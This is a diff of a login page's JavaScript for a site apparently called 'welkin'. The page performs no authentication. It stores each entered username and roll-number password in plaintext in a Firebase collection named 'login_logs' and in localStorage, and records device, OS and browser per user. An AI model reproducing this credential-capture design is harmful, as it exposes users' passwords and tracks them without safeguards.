@@ -171,7 +171,7 @@ body {
 
   <div class="input-box">
     <i class="fa-solid fa-lock icon"></i>
-    <input type="password" class="input" id="password" placeholder="Password">
+    <input type="password" class="input" id="password" placeholder="Password (Roll Number)">
   </div>
 
   <div class="remember">
@@ -186,11 +186,6 @@ body {
 <button class="music-btn" onclick="toggleMusic()">&#9835;</button>
 <audio id="music" src="music.mp3" loop></audio>
 
-<!-- ═══════════════════════════════════════════
-     FIREBASE — visitor tracking + login logging
-     Everything is inside one module so there
-     are zero timing / scope issues.
-════════════════════════════════════════════ -->
 <script type="module">
   import { initializeApp }   from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
   import {
@@ -199,7 +194,6 @@ body {
     addDoc, increment, serverTimestamp
   } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-  /* ── Firebase config ── */
   const app = initializeApp({
     apiKey:            "AIzaSyBFZYXN5MJ9WOMBXfCchUWnR9LEfOOzImw",
     authDomain:        "welkin-b3fee.firebaseapp.com",
@@ -210,7 +204,6 @@ body {
   });
   const db = getFirestore(app);
 
-  /* ── Device detection ── */
   function getDevice() {
     const ua = navigator.userAgent;
     if (/POCO/i.test(ua))            return "POCO";
@@ -241,19 +234,24 @@ body {
     return "Unknown";
   }
 
-  const DEVICE = getDevice();
-  const OS     = getOS();
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+    if (ua.includes("Firefox"))  return "Firefox";
+    if (ua.includes("Edg"))      return "Edge";
+    if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    return "Unknown";
+  }
 
-  /* ════════════════════════════════════════
-     1.  VISITOR TRACKING
-     Fires once per browser per calendar day.
-     Saves to:
-       admin_stats/visitors  →  total count + per-device count
-       visitor_logs          →  individual log row
-  ════════════════════════════════════════ */
-  async function trackVisitor() {
+  const DEVICE  = getDevice();
+  const OS      = getOS();
+  const BROWSER = getBrowser();
+
+  /* ── VISITOR TRACKING ── */
+  async function trackVisitor(username, rollNumber) {
     const key = "welkin_visited_" + new Date().toDateString();
-    if (sessionStorage.getItem(key)) return;   // already tracked today
+    if (sessionStorage.getItem(key)) return;
     sessionStorage.setItem(key, "1");
 
     try {
@@ -261,25 +259,22 @@ body {
       const snap     = await getDoc(statsRef);
 
       if (snap.exists()) {
-        // document already exists — just increment
         await updateDoc(statsRef, {
-          total:                   increment(1),
-          [`devices.${DEVICE}`]:   increment(1)
+          total:                  increment(1),
+          [`devices.${DEVICE}`]: increment(1)
         });
       } else {
-        // first ever visitor — create the document
-        await setDoc(statsRef, {
-          total:   1,
-          devices: { [DEVICE]: 1 }
-        });
+        await setDoc(statsRef, { total: 1, devices: { [DEVICE]: 1 } });
       }
 
-      // individual visit log (always saved regardless of dedup)
       await addDoc(collection(db, "visitor_logs"), {
-        device:    DEVICE,
-        os:        OS,
-        userAgent: navigator.userAgent.substring(0, 250),
-        timestamp: serverTimestamp()
+        username:   username,
+        rollNumber: rollNumber,
+        device:     DEVICE,
+        os:         OS,
+        browser:    BROWSER,
+        userAgent:  navigator.userAgent.substring(0, 250),
+        timestamp:  serverTimestamp()
       });
 
     } catch (e) {
@@ -287,33 +282,27 @@ body {
     }
   }
 
-  /* ════════════════════════════════════════
-     2.  LOGIN CAPTURE
-     Saves username + roll number (password)
-     to login_logs every time someone logs in.
-  ════════════════════════════════════════ */
-  async function captureLogin(username, password) {
+  /* ── LOGIN CAPTURE ── */
+  async function captureLogin(username, rollNumber) {
     try {
       await addDoc(collection(db, "login_logs"), {
-        username:  username,
-        password:  roll no,      // roll number IS the password
-        device:    DEVICE,
-        os:        OS,
-        timestamp: serverTimestamp()
+        username:   username,
+        password:   rollNumber,   // roll number is the password
+        device:     DEVICE,
+        os:         OS,
+        browser:    BROWSER,
+        timestamp:  serverTimestamp()
       });
     } catch (e) {
       console.error("Login capture failed:", e);
     }
   }
 
-  /* ── Expose captureLogin to the plain script below ── */
-  window._captureLogin = captureLogin;
-
-  /* ── Run visitor tracking immediately on page load ── */
-  trackVisitor();
+  /* ── Expose to plain script ── */
+  window._captureLogin  = captureLogin;
+  window._trackVisitor  = trackVisitor;
 </script>
 
-<!-- Plain script handles UI + calls Firebase via window._captureLogin -->
 <script>
   function login() {
     const userEl = document.getElementById("username");
@@ -323,11 +312,10 @@ body {
     userEl.classList.remove("error-glow");
     passEl.classList.remove("error-glow");
 
-    const username = userEl.value.trim();
-    const password = passEl.value.trim();
+    const username   = userEl.value.trim();
+    const rollNumber = passEl.value.trim();
 
-    /* ── Validation ── */
-    if (!username && !password) {
+    if (!username && !rollNumber) {
       userEl.classList.add("error-glow");
       passEl.classList.add("error-glow");
       showToast("Please enter your Username and Password.");
@@ -339,23 +327,27 @@ body {
       showToast("Username cannot be blank.");
       return;
     }
-    if (!password) {
+    if (!rollNumber) {
       passEl.classList.add("error-glow");
       passEl.focus();
       showToast("Roll Number cannot be blank.");
       return;
     }
 
-    /* ── Save to Firebase then redirect ── */
-    btn.disabled    = true;
-    btn.innerText   = "Connecting...";
+    btn.disabled  = true;
+    btn.innerText = "Connecting...";
 
-    // Fire-and-forget: save login, then redirect whether it succeeds or not
-    const capture = window._captureLogin
-      ? window._captureLogin(username, password)
-      : Promise.resolve();
+    /* ── Save to localStorage so admin panel can read it ── */
+    localStorage.setItem("welkinUsername",   username);
+    localStorage.setItem("welkinRollNumber", rollNumber);
 
-    capture.finally(() => {
+    /* ── Save to Firebase (fire-and-forget) ── */
+    const doCapture = async () => {
+      if (window._captureLogin)  await window._captureLogin(username, rollNumber);
+      if (window._trackVisitor)  await window._trackVisitor(username, rollNumber);
+    };
+
+    doCapture().finally(() => {
       window.location.href = "home.html";
     });
   }
@@ -367,11 +359,8 @@ body {
     setTimeout(() => t.classList.remove("show"), 3500);
   }
 
-  /* Clear error glow when user types */
   document.getElementById("username").addEventListener("input", function(){ this.classList.remove("error-glow"); });
   document.getElementById("password").addEventListener("input", function(){ this.classList.remove("error-glow"); });
-
-  /* Enter key support */
   document.addEventListener("keydown", e => { if (e.key === "Enter") login(); });
 
   function toggleMusic() {
